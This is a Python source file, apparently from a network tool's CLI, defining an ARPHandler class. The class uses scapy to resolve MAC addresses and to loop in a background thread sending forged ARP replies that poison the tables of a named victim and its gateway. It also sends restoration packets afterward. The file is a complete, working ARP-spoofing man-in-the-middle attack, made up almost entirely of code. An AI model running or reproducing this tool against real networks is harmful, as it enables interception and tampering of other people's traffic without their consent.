import logging
import threading
import time

from scapy.all import ARP, Ether, sendp, srp1  # type: ignore

logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)


class ARPHandler:
    """
    Handles ARP spoofing and restoration on a given interface.
    Now uses a background thread so the main CLI remains responsive.
    """

    def __init__(self, interface: str, interval: float = 2.0):
        self.interface = interface
        self.interval = interval

        self._stop_event = threading.Event()
        self._thread: threading.Thread | None = None

        # Cached values for current spoof run
        self.victim_ip: str | None = None
        self.gateway_ip: str | None = None
        self.victim_mac: str | None = None
        self.gateway_mac: str | None = None
        self.attacker_mac: str | None = None

        logger.info("ARPHandler initialized on interface: %s", self.interface)

    def _resolve_mac(self, ip: str) -> str | None:
        """
        Resolve a MAC address for an IP using an ARP request.
        """
        try:
            ans = srp1(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                timeout=2,
                iface=self.interface,
                verbose=False,
            )
            if ans is None:
                return None

            if Ether in ans:
                return ans[Ether].src
            if ARP in ans:
                return ans[ARP].hwsrc

            return None
        except Exception as e:
            logger.error(f"Error resolving MAC for {ip}: {e}", exc_info=True)
            return None

    def _spoof_loop(self):
        """
        Background loop that continuously sends forged ARP replies
        to victim and gateway until stopped.
        """
        if not all([self.victim_ip, self.gateway_ip, self.victim_mac, self.gateway_mac, self.attacker_mac]):
            logger.error("Spoof loop started with incomplete parameters.")
            return

        logger.info(
            "Starting ARP spoofing:\n"
            f"  victim  {self.victim_ip} ({self.victim_mac})\n"
            f"  gateway {self.gateway_ip} ({self.gateway_mac})\n"
            f"  attacker_mac {self.attacker_mac} on {self.interface}"
        )

        while not self._stop_event.is_set():
            try:
                # Tell victim: "gateway IP is at attacker MAC"
                pkt_to_victim = (
                        Ether(dst=self.victim_mac) /
                        ARP(
                            op=2,
                            psrc=self.gateway_ip,
                            pdst=self.victim_ip,
                            hwdst=self.victim_mac,
                            hwsrc=self.attacker_mac,
                        )
                )

                # Tell gateway: "victim IP is at attacker MAC"
                pkt_to_gateway = (
                        Ether(dst=self.gateway_mac) /
                        ARP(
                            op=2,
                            psrc=self.victim_ip,
                            pdst=self.gateway_ip,
                            hwdst=self.gateway_mac,
                            hwsrc=self.attacker_mac,
                        )
                )

                sendp(pkt_to_victim, iface=self.interface, verbose=False)
                sendp(pkt_to_gateway, iface=self.interface, verbose=False)

            except Exception as e:
                logger.error(f"Error sending spoofed ARP packets: {e}", exc_info=True)

            time.sleep(self.interval)

        logger.info("ARP spoofing loop stopped.")

    def start_spoofing(
            self,
            victim_ip: str,
            gateway_ip: str,
            attacker_mac: str | None = None,
            victim_mac: str | None = None,
            gateway_mac: str | None = None,
    ) -> bool:
        """
        Prepare and start ARP spoofing in a background thread.

        We prefer MACs supplied from the database (Host table).
        If they are missing, we try to resolve them via ARP.
        """

        # Prefer DB-provided MACs; only ARP-resolve if missing
        if victim_mac is None:
            victim_mac = self._resolve_mac(victim_ip)
        if gateway_mac is None:
            gateway_mac = self._resolve_mac(gateway_ip)

        if not victim_mac or not gateway_mac or not attacker_mac:
            logger.error(
                "Could not resolve MAC addresses: "
                f"victim_ip={victim_ip}, victim_mac={victim_mac}, "
                f"gateway_ip={gateway_ip}, gateway_mac={gateway_mac}, "
                f"attacker_mac={attacker_mac}"
            )
            return False

        # Cache details for loop + restoration
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.victim_mac = victim_mac
        self.gateway_mac = gateway_mac
        self.attacker_mac = attacker_mac

        self._stop_event.clear()
        self._thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self._thread.start()

        logger.info("ARP spoofing thread started.")
        return True

    def stop_spoofing_and_restore(
            self,
            victim_ip: str,
            gateway_ip: str,
            victim_mac: str,
            gateway_mac: str,
    ):
        """
        Stop the spoofing loop and attempt to restore correct ARP entries
        for victim and gateway.
        """
        logger.info(
            "Restoring ARP tables for victim=%s (%s) and gateway=%s (%s)",
            victim_ip,
            victim_mac,
            gateway_ip,
            gateway_mac,
        )

        # Stop loop
        self._stop_event.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3)

        try:
            # Send legitimate ARP replies a few times
            pkt_to_victim = (
                    Ether(dst=victim_mac) /
                    ARP(
                        op=2,
                        psrc=gateway_ip,
                        pdst=victim_ip,
                        hwdst=victim_mac,
                        hwsrc=gateway_mac,
                    )
            )

            pkt_to_gateway = (
                    Ether(dst=gateway_mac) /
                    ARP(
                        op=2,
                        psrc=victim_ip,
                        pdst=gateway_ip,
                        hwdst=gateway_mac,
                        hwsrc=victim_mac,
                    )
            )

            for _ in range(3):
                sendp(pkt_to_victim, iface=self.interface, verbose=False)
                sendp(pkt_to_gateway, iface=self.interface, verbose=False)
                time.sleep(0.5)

            logger.info("Sent ARP restoration packets to victim and gateway.")
        except Exception as e:
            logger.error(f"Error while restoring ARP tables: {e}", exc_info=True)
